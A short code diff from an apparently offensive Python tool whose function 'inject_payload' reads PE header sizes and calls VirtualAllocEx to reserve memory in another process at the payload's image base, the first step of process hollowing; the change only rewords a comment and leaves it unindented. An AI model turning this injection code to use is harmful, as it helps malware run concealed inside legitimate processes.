@@ -285,7 +285,7 @@ def inject_payload(pi, payload_data: bytes, image_base: int):
     size_of_image   = struct.unpack_from("<I", payload_data, opt_header_offset + 56)[0]
     size_of_headers = struct.unpack_from("<I", payload_data, opt_header_offset + 60)[0]
 
-    # allocate space in target process at the old image base
+# make some room in the target process at the old base address
     remote_base = kernel32.VirtualAllocEx(
         pi.hProcess,
         image_base,
